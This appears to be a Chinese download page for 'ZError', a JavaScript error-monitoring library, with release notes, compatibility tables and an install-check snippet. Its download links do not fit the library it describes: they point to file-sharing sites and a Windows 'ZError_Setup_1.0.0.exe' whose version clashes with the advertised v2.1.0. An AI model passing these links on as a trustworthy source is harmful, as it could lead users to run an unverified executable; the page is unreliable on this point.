# 下载 ZError

获取最新版本的ZError，开始构建更稳定的应用程序。

## 最新版本

### ZError v2.1.0
**发布日期**: 2024年6月28日

#### 新功能
- 🚀 新增性能监控功能
- 🔍 改进错误堆栈跟踪精度
- 📱 增强移动端支持
- 🛡️ 新增隐私保护选项

#### 改进
- 优化内存使用，减少50%内存占用
- 提升错误捕获速度
- 改进TypeScript类型定义
- 增强错误过滤功能

#### 修复
- 修复在某些浏览器中的兼容性问题
- 解决异步错误捕获的时序问题
- 修复配置热更新的bug

---

## 下载方式

- [夸克](https://pan.quark.cn/s/bd239b18e329)
- [蓝奏云](https://wwyl.lanzouv.com/b00ocrzzje)    密码：43so
- [直链下载](https://dwpan.com/f/bYhj/ZError_Setup_1.0.0.exe)


## 版本历史

### v2.0.5 (2024年5月15日)
- 修复React 18兼容性问题
- 优化错误去重算法
- 新增Vue 3支持

### v2.0.0 (2024年3月20日)
- 🎉 重大版本更新
- 全新的API设计
- 支持插件化架构
- 新增实时错误监控

### v1.8.2 (2024年1月10日)
- 修复内存泄漏问题
- 改进错误报告格式
- 增强安全性

### v1.7.0 (2023年11月5日)
- 新增面包屑导航功能
- 支持自定义错误级别
- 优化性能监控

[查看完整版本历史](https://github.com/zerror/zerror/releases)

---

## 浏览器兼容性

| 浏览器 | 最低版本 | 推荐版本 |
|--------|----------|----------|
| Chrome | 60+ | 最新版 |
| Firefox | 55+ | 最新版 |
| Safari | 12+ | 最新版 |
| Edge | 79+ | 最新版 |
| IE | 不支持 | - |
| iOS Safari | 12+ | 最新版 |
| Android Chrome | 60+ | 最新版 |

---

## 框架支持

### 前端框架
- ✅ **React** 16.8+
- ✅ **Vue** 2.6+ / 3.0+
- ✅ **Angular** 10+
- ✅ **Svelte** 3.0+
- ✅ **Vanilla JavaScript**

### 移动端框架
- ✅ **React Native** 0.60+
- ✅ **Ionic** 5.0+
- ✅ **Cordova/PhoneGap**
- ✅ **Flutter** (通过WebView)

### 后端环境
- ✅ **Node.js** 12+
- ✅ **Electron** 8.0+
- ✅ **Deno** 1.0+

---

## 安装验证

安装完成后，您可以通过以下代码验证ZError是否正确安装：

```javascript
// Node.js / ES6 模块
import ZError from 'zerror';
console.log('ZError版本:', ZError.version);

// CommonJS
const ZError = require('zerror');
console.log('ZError版本:', ZError.version);

// 浏览器全局变量
console.log('ZError版本:', window.ZError.version);

// 创建实例测试
const errorHandler = new ZError({
  appName: 'TestApp',
  debug: true
});

errorHandler.captureMessage('ZError安装成功！', 'info');
```

---

## 获取帮助

如果您在下载或安装过程中遇到问题，可以通过以下方式获取帮助：

- 📖 [快速开始指南](/zerror/getting-started)
- 📚 [使用文档](/zerror/guide)
- 🐛 [问题反馈](https://github.com/zerror/zerror/issues)
- 💬 [社区讨论](https://github.com/zerror/zerror/discussions)
- 📧 [邮件支持](mailto:support@zerror.dev)

---

## 许可证

ZError 采用 MIT 许可证，您可以自由使用、修改和分发。

[查看完整许可证](https://github.com/zerror/zerror/blob/main/LICENSE)

---

**开始使用ZError，让您的应用更加稳定可靠！** 🚀